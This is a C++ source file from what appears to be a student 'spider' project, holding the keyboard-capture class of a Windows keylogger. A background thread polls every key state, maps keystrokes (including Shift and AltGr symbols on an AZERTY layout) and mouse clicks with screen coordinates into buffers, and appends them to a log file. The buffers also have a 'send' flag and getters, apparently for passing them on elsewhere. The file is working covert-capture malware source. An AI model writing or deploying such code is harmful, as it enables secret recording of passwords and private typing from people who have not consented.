/*
** KeyboardEvent.cpp for C:\Users\fagnol_r\Desktop\cpp_spider in C:\Users\fagnol_r\Desktop\cpp_spider\Client\Sources
**
** Made by
** Login   <fagnol_r@epitech.net>
**
** Started on  Sat Sep 30 16:12:50 2017
** Last update Sun Oct 08 17:49:58 2017 fagnol_r
*/

#include "KeyboardEvent.hpp"

KeyboardEvent::KeyboardEvent()
{
  _nbPress = 0;
  this->_isMaj = false;
  this->_isSend = false;
  _sousa = true;
}

KeyboardEvent::~KeyboardEvent()
{
}

void      KeyboardEvent::setSend(bool send)
{
  this->_isSend = send;
}

bool      KeyboardEvent::getSend()
{
  return (_isSend);
}

void          KeyboardEvent::writeLog()
{
    if (_key == MK_LBUTTON)
    {
      GetCursorPos(&this->_position);
      _mouseBuffer += "[CLIQUE GAUCHE " + std::to_string(_position.x) + " / " + std::to_string(_position.y) + "]\n";
      return;
    }
    if (_key == MK_RBUTTON)
    {
      GetCursorPos(&this->_position);
      _mouseBuffer += "[CLIQUE DROIT " + std::to_string(_position.x) + " / " + std::to_string(_position.y) + "]\n";
      return;
    }
    if (this->_key == 20)
    {
      this->_keyBuffer += "[CAPSLOCK]";
      if (this->_isMaj == true)
        _isMaj = false;
      else if (this->_isMaj == false)
        _isMaj = true;
      return;
    }
    if (this->_key == 18)
    {
      return;
    }

    if (this->_key == 8)
    {
      if (this->_keyBuffer.size() != 0)
      {
        if (this->_keyBuffer[this->_keyBuffer.size() - 1] == ']')
          this->_keyBuffer.erase(this->_keyBuffer.rfind('['));
        else if (this->_keyBuffer.size() != 0)
          this->_keyBuffer.pop_back();
      }
      return;
    }

    switch (this->_key) {
      case 49:
        this->_keyBuffer += "&";
      break;
      case 50:
        this->_keyBuffer += "é";
      break;
      case 51:
        this->_keyBuffer += "\"";
      break;
      case 52:
        this->_keyBuffer += "\'";
      break;
      case 53:
        this->_keyBuffer += "(";
      break;
      case 54:
        this->_keyBuffer += "-";
      break;
      case 55:
        this->_keyBuffer += "è";
      break;
      case 56:
        this->_keyBuffer += "_";
      break;
      case 57:
        this->_keyBuffer += "ç";
      break;
      case 48:
        this->_keyBuffer += "à";
      break;
      case 13:
        this->_keyBuffer += "[ENTRER]";
      break;
      case 32:
        this->_keyBuffer += " ";
      break;
      case VK_TAB:
        this->_keyBuffer += "[TAB]";
      break;
      case 17:
        this->_keyBuffer += "[CONTROL]";
      break;
      case VK_ESCAPE:
        this->_keyBuffer += "[ESCAPE]";
      break;
      case VK_END:
        this->_keyBuffer += "[END]";
      break;
      case VK_HOME:
        this->_keyBuffer += "[HOME]";
      break;
      case VK_LEFT:
        this->_keyBuffer += "[LEFT]";
      break;
      case VK_UP:
        this->_keyBuffer += "[UP]";
      break;
      case VK_RIGHT:
        this->_keyBuffer += "[RIGHT]";
      break;
      case VK_DOWN:
        this->_keyBuffer += "[DOWN]";
      break;
      default:
        this->_keyBuffer += (this->_key + 32);
//      case /* value */:
    }
}

void          KeyboardEvent::writeMaj()
{
  if (_key != VK_SHIFT)
    this->_keyBuffer += _key;
}

void          KeyboardEvent::writeAltGr()
{
  if (_key != 17)
  {
    this->_key == 51 ? this->_keyBuffer += "#" :
    this->_key == 52 ? this->_keyBuffer += "{" :
    this->_key == 53 ? this->_keyBuffer += "[" :
    this->_key == 54 ? this->_keyBuffer += "|" :
    this->_key == 55 ? this->_keyBuffer += "`" :
    this->_key == 56 ? this->_keyBuffer += "\\" :
    this->_key == 57 ? this->_keyBuffer += "^" :
    this->_key == 48 ? this->_keyBuffer += "@" :
    this->_key == 69 ? this->_keyBuffer += "€" : this->_keyBuffer += "";
  }
}

void          KeyboardEvent::init()
{
  _t = std::thread(&KeyboardEvent::getKey, this);
}

std::thread &KeyboardEvent::getThread()
{
  return _t;
}

void KeyboardEvent::setSousa(bool test)
{
  _sousa = test;
}

void          KeyboardEvent::getKey()
{
  while (1)
  {
    for(_key = 0; _key <= 190; _key++)
    {
      if (GetAsyncKeyState(_key) == -32767)
      {
        if (GetKeyState(_key) && GetKeyState(VK_SHIFT) < 0)
          writeMaj();
        else if (GetKeyState(_key) && GetKeyState(18) < 0)
          writeAltGr();
        else
          writeLog();
      }
    }
  }
}

void          KeyboardEvent::eraseMouseString()
{
  this->_mouseBuffer.erase();
}

void          KeyboardEvent::eraseKeyboardString()
{
  this->_keyBuffer.erase();
}

std::string   KeyboardEvent::getMouseBuffer()
{
  return this->_mouseBuffer;
}

std::string   KeyboardEvent::getKeyboardBuffer()
{
  return this->_keyBuffer;
}

void          KeyboardEvent::writeDataInFile()
{
  _logs.open ("C:\\Users\\fagnol_r\\Desktop\\cpp_spider\\logs.txt", std::fstream::in | std::fstream::out | std::fstream::app);
//  if (_keyBuffer.size() != 0)
    _logs << _keyBuffer;
  _logs.close();
  this->_keyBuffer.erase();
}
